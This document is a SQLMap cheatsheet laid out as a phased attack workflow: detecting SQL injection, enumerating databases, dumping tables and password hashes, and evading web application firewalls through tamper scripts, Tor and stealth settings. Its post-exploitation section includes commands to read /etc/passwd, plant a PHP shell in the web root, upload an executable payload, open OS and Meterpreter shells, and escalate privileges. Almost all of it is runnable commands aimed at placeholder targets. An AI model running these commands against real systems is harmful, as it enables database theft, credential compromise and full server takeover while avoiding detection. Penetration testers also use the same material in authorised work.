# SQLMap Cheatsheet

### Overview

SQLMap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities. It supports a wide range of database management systems and injection techniques.

***

### Core Syntax

```bash
sqlmap [options] -u "URL" 
sqlmap [options] -r request.txt
```

***

### Learning Workflow

**Phase 1: Detection** — Identify injectable parameters\
**Phase 2: Enumeration** — Map the database structure\
**Phase 3: Extraction** — Retrieve data from targets\
**Phase 4: Advanced** — Evasion, optimisation, and post-exploitation

***

### Phase 1: Detection & Basic Testing

#### Target Specification

```bash
# URL with parameter (mark injectable param with *)
sqlmap -u "http://target.com/page.php?id=1"
sqlmap -u "http://target.com/page.php?id=1*&category=2"

# From Burp/ZAP saved request file
sqlmap -r request.txt

# Parse targets from sitemap
sqlmap -x "http://target.com/sitemap.xml"

# Direct database connection (for post-exploitation)
sqlmap -d "mysql://user:pass@target:3306/dbname"
```

#### Request Methods

```bash
# POST data
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Specify parameter to test
sqlmap -u "http://target.com/page.php?id=1&cat=2" -p id

# Test all parameters
sqlmap -u "http://target.com/page.php?id=1&cat=2" --level=5

# Cookie injection
sqlmap -u "http://target.com/page.php" --cookie="session=abc123; id=1*"

# Header injection
sqlmap -u "http://target.com/page.php" --headers="X-Forwarded-For: 127.0.0.1*"

# User-Agent injection
sqlmap -u "http://target.com/page.php" --user-agent="test" --level=3
```

#### Detection Options

```bash
# Increase detection level (1-5, default 1)
# Higher = more payloads, more parameters tested
sqlmap -u "URL" --level=3

# Increase risk level (1-3, default 1)
# Higher = more aggressive payloads (OR-based, heavy queries)
sqlmap -u "URL" --risk=3

# Full detection
sqlmap -u "URL" --level=5 --risk=3

# Test specific injection techniques
sqlmap -u "URL" --technique=BEUSTQ
```

#### Injection Techniques (`--technique`)

<table><thead><tr><th width="108">Letter</th><th width="280">Technique</th><th>Description</th></tr></thead><tbody><tr><td><code>B</code></td><td>Boolean-based blind</td><td>Infers data from true/false responses</td></tr><tr><td><code>E</code></td><td>Error-based</td><td>Extracts data from error messages</td></tr><tr><td><code>U</code></td><td>Union query-based</td><td>Uses UNION SELECT to retrieve data</td></tr><tr><td><code>S</code></td><td>Stacked queries</td><td>Executes multiple statements (;)</td></tr><tr><td><code>T</code></td><td>Time-based blind</td><td>Infers data from response delays</td></tr><tr><td><code>Q</code></td><td>Inline queries</td><td>Nested queries within other statements</td></tr></tbody></table>

```bash
# Test only union and error-based
sqlmap -u "URL" --technique=UE

# Test only blind techniques
sqlmap -u "URL" --technique=BT
```

#### Quick Detection Scan

```bash
# Fast detection, minimal output
sqlmap -u "http://target.com/page.php?id=1" --batch --smart

# Detect and identify DBMS only
sqlmap -u "URL" --fingerprint

# Check if parameter is injectable (no exploitation)
sqlmap -u "URL" --is-dba
```

***

### Phase 2: Enumeration

#### Database Fingerprinting

```bash
# Identify DBMS
sqlmap -u "URL" --fingerprint

# Force specific DBMS (skip detection)
sqlmap -u "URL" --dbms=mysql
sqlmap -u "URL" --dbms=mssql
sqlmap -u "URL" --dbms=postgresql
sqlmap -u "URL" --dbms=oracle
sqlmap -u "URL" --dbms=sqlite
```

#### Information Gathering

```bash
# Get current user
sqlmap -u "URL" --current-user

# Get current database
sqlmap -u "URL" --current-db

# Check if current user is DBA
sqlmap -u "URL" --is-dba

# Get server hostname
sqlmap -u "URL" --hostname

# List all users
sqlmap -u "URL" --users

# List all databases
sqlmap -u "URL" --dbs

# Get DBMS banner
sqlmap -u "URL" --banner
```

#### Schema Enumeration

```bash
# List tables in a database
sqlmap -u "URL" -D database_name --tables

# List columns in a table
sqlmap -u "URL" -D database_name -T table_name --columns

# Count rows in table
sqlmap -u "URL" -D database_name -T table_name --count

# Full schema dump
sqlmap -u "URL" --schema
```

#### Standard Enumeration Workflow

```bash
# Step 1: List databases
sqlmap -u "URL" --dbs --batch

# Step 2: List tables in target database
sqlmap -u "URL" -D targetdb --tables --batch

# Step 3: List columns in target table
sqlmap -u "URL" -D targetdb -T users --columns --batch

# Step 4: Dump specific columns
sqlmap -u "URL" -D targetdb -T users -C username,password --dump --batch
```

***

### Phase 3: Data Extraction

#### Dumping Data

```bash
# Dump entire table
sqlmap -u "URL" -D database -T table --dump

# Dump specific columns
sqlmap -u "URL" -D database -T table -C col1,col2 --dump

# Dump all tables in database
sqlmap -u "URL" -D database --dump-all

# Dump everything (all databases)
sqlmap -u "URL" --dump-all

# Limit rows returned
sqlmap -u "URL" -D db -T table --dump --start=1 --stop=100

# Dump with condition
sqlmap -u "URL" -D db -T table --dump --where="id>100"
```

#### Password Handling

```bash
# Dump passwords and attempt to crack
sqlmap -u "URL" --passwords

# Dump user password hashes
sqlmap -u "URL" -D db -T users -C password --dump

# Don't crack hashes (just dump)
sqlmap -u "URL" --passwords --no-crack
```

#### Search Functions

```bash
# Search for databases containing keyword
sqlmap -u "URL" --search -D admin

# Search for tables containing keyword
sqlmap -u "URL" --search -T user

# Search for columns containing keyword
sqlmap -u "URL" --search -C password

# Combined search
sqlmap -u "URL" --search -C email,pass,credit
```

#### Output Formats

```bash
# Output to CSV
sqlmap -u "URL" -D db -T table --dump --csv-del=";"

# Output directory
sqlmap -u "URL" --output-dir=/path/to/output

# Save traffic to HAR file
sqlmap -u "URL" --har=traffic.har
```

***

### Phase 4: Advanced Techniques

#### Authentication

```bash
# Basic auth
sqlmap -u "URL" --auth-type=basic --auth-cred="user:pass"

# Digest auth
sqlmap -u "URL" --auth-type=digest --auth-cred="user:pass"

# NTLM auth
sqlmap -u "URL" --auth-type=ntlm --auth-cred="domain\\user:pass"

# Cookie-based session
sqlmap -u "URL" --cookie="PHPSESSID=abc123"

# Load cookies from file
sqlmap -u "URL" --load-cookies=cookies.txt
```

#### Proxy & Traffic

```bash
# Route through proxy
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"

# Proxy with auth
sqlmap -u "URL" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"

# Route through Tor
sqlmap -u "URL" --tor --tor-type=SOCKS5

# Check Tor connection
sqlmap -u "URL" --tor --check-tor
```

#### Evasion Techniques

```bash
# Tamper scripts (modify payloads to bypass WAF/filters)
sqlmap -u "URL" --tamper=space2comment

# Multiple tamper scripts
sqlmap -u "URL" --tamper="space2comment,between,randomcase"

# Random User-Agent
sqlmap -u "URL" --random-agent

# Delay between requests (seconds)
sqlmap -u "URL" --delay=2

# Randomise delay
sqlmap -u "URL" --randomize=id

# Safe URL (visit between injections to stay logged in)
sqlmap -u "URL" --safe-url="http://target.com/home.php" --safe-freq=3
```

#### Common Tamper Scripts

<table><thead><tr><th width="250">Script</th><th>Purpose</th></tr></thead><tbody><tr><td><code>space2comment</code></td><td>Replace spaces with /**/</td></tr><tr><td><code>space2plus</code></td><td>Replace spaces with +</td></tr><tr><td><code>space2randomblank</code></td><td>Replace spaces with random whitespace</td></tr><tr><td><code>between</code></td><td>Replace > with NOT BETWEEN 0 AND</td></tr><tr><td><code>randomcase</code></td><td>Randomize character case</td></tr><tr><td><code>charencode</code></td><td>URL-encode characters</td></tr><tr><td><code>base64encode</code></td><td>Base64 encode payload</td></tr><tr><td><code>equaltolike</code></td><td>Replace = with LIKE</td></tr><tr><td><code>greatest</code></td><td>Replace > with GREATEST</td></tr><tr><td><code>apostrophemask</code></td><td>Replace ' with UTF-8 equivalent</td></tr><tr><td><code>percentage</code></td><td>Add % between characters</td></tr></tbody></table>

```bash
# List all tamper scripts
sqlmap --list-tampers

# WAF bypass combination
sqlmap -u "URL" --tamper="space2comment,randomcase,between" --random-agent
```

#### Performance Optimization

```bash
# Number of threads (1-10)
sqlmap -u "URL" --threads=10

# Optimise for speed (combines multiple flags)
sqlmap -u "URL" -o

# Predict common values
sqlmap -u "URL" --predict-output

# Keep connection alive
sqlmap -u "URL" --keep-alive

# Null connection (for blind SQLi bandwidth saving)
sqlmap -u "URL" --null-connection

# Set timeout
sqlmap -u "URL" --timeout=30
```

***

### Post-Exploitation

#### File System Access

```bash
# Read file from server
sqlmap -u "URL" --file-read="/etc/passwd"
sqlmap -u "URL" --file-read="C:/Windows/win.ini"

# Write file to server
sqlmap -u "URL" --file-write="local_shell.php" --file-dest="/var/www/html/shell.php"

# Upload file
sqlmap -u "URL" --file-write="payload.exe" --file-dest="C:/temp/payload.exe"
```

#### OS Command Execution

```bash
# Interactive OS shell
sqlmap -u "URL" --os-shell

# Execute single command
sqlmap -u "URL" --os-cmd="whoami"

# Spawn Meterpreter/VNC session
sqlmap -u "URL" --os-pwn

# Windows registry access
sqlmap -u "URL" --reg-read
```

#### Database Interaction

```bash
# Interactive SQL shell
sqlmap -u "URL" --sql-shell

# Execute SQL query
sqlmap -u "URL" --sql-query="SELECT user()"

# Execute SQL from file
sqlmap -u "URL" --sql-file=queries.sql
```

#### Privilege Escalation

```bash
# Attempt privilege escalation
sqlmap -u "URL" --priv-esc

# UDF injection (MySQL/PostgreSQL)
sqlmap -u "URL" --udf-inject
```

***

### Workflow Examples

#### Full Assessment Workflow

```bash
# 1. Initial detection
sqlmap -u "http://target.com/page.php?id=1" --batch --smart

# 2. Deep detection if initial fails
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch

# 3. Enumerate after confirmed injectable
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch

# 4. Target specific database
sqlmap -u "http://target.com/page.php?id=1" -D webapp --tables --batch

# 5. Extract high-value data
sqlmap -u "http://target.com/page.php?id=1" -D webapp -T users --dump --batch

# 6. Check for system access
sqlmap -u "http://target.com/page.php?id=1" --is-dba --batch
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

#### Testing From Burp Request

```bash
# 1. Save request from Burp to file
# 2. Mark injection point with *
# 3. Run SQLMap
sqlmap -r request.txt --batch --level=3

# With specific parameter
sqlmap -r request.txt -p "productId" --batch
```

#### WAF Bypass Workflow

```bash
# 1. Initial test (likely blocked)
sqlmap -u "URL" --batch

# 2. Add evasion
sqlmap -u "URL" --tamper=space2comment --random-agent --batch

# 3. Increase evasion
sqlmap -u "URL" --tamper="space2comment,between,randomcase" \
    --random-agent --delay=2 --batch

# 4. Try different technique
sqlmap -u "URL" --technique=T --tamper="space2comment,charencode" \
    --random-agent --delay=3 --batch
```

***

### Session Management

```bash
# Save session data
sqlmap -u "URL" --output-dir=/path/to/output

# Resume previous session
sqlmap -u "URL" --resume

# Flush session (start fresh)
sqlmap -u "URL" --flush-session

# Session file location
# Default: ~/.local/share/sqlmap/output/
```

***

### Useful Flag Combinations

#### Quick Detection

```bash
sqlmap -u "URL" --batch --smart
```

#### Stealth Mode

```bash
sqlmap -u "URL" --random-agent --delay=3 --tamper=space2comment \
    --technique=BT --batch
```

#### Maximum Detection

```bash
sqlmap -u "URL" --level=5 --risk=3 --threads=10 --batch
```

#### Full Dump

```bash
sqlmap -u "URL" -D database --dump-all --threads=5 --batch
```

#### Through Burp Proxy

```bash
sqlmap -u "URL" --proxy="http://127.0.0.1:8080" --batch
```

***

### Quick Reference Card

<table><thead><tr><th width="270">Task</th><th>Command</th></tr></thead><tbody><tr><td>Basic test</td><td><code>sqlmap -u "URL" --batch</code></td></tr><tr><td>From request file</td><td><code>sqlmap -r req.txt --batch</code></td></tr><tr><td>List databases</td><td><code>sqlmap -u "URL" --dbs</code></td></tr><tr><td>List tables</td><td><code>sqlmap -u "URL" -D db --tables</code></td></tr><tr><td>List columns</td><td><code>sqlmap -u "URL" -D db -T tbl --columns</code></td></tr><tr><td>Dump table</td><td><code>sqlmap -u "URL" -D db -T tbl --dump</code></td></tr><tr><td>Get shell</td><td><code>sqlmap -u "URL" --os-shell</code></td></tr><tr><td>SQL shell</td><td><code>sqlmap -u "URL" --sql-shell</code></td></tr><tr><td>Current user</td><td><code>sqlmap -u "URL" --current-user</code></td></tr><tr><td>Check DBA</td><td><code>sqlmap -u "URL" --is-dba</code></td></tr><tr><td>Read file</td><td><code>sqlmap -u "URL" --file-read="/etc/passwd"</code></td></tr><tr><td>Use proxy</td><td><code>sqlmap -u "URL" --proxy="http://127.0.0.1:8080"</code></td></tr><tr><td>Bypass WAF</td><td><code>sqlmap -u "URL" --tamper=space2comment --random-agent</code></td></tr><tr><td>Max detection</td><td><code>sqlmap -u "URL" --level=5 --risk=3</code></td></tr></tbody></table>

***

### Common Issues & Fixes

<table><thead><tr><th width="261">Issue</th><th>Solution</th></tr></thead><tbody><tr><td>No injection found</td><td>Increase <code>--level</code> and <code>--risk</code></td></tr><tr><td>WAF blocking</td><td>Add <code>--tamper</code> scripts and <code>--random-agent</code></td></tr><tr><td>Session timeout</td><td>Use <code>--safe-url</code> with <code>--safe-freq</code></td></tr><tr><td>Slow extraction</td><td>Increase <code>--threads</code>, use <code>--technique=E,U</code></td></tr><tr><td>False positives</td><td>Use <code>--string</code> or <code>--regexp</code> to define true condition</td></tr><tr><td>HTTPS errors</td><td>Add <code>--force-ssl</code></td></tr><tr><td>Connection issues</td><td>Adjust <code>--timeout</code> and <code>--retries</code></td></tr></tbody></table>
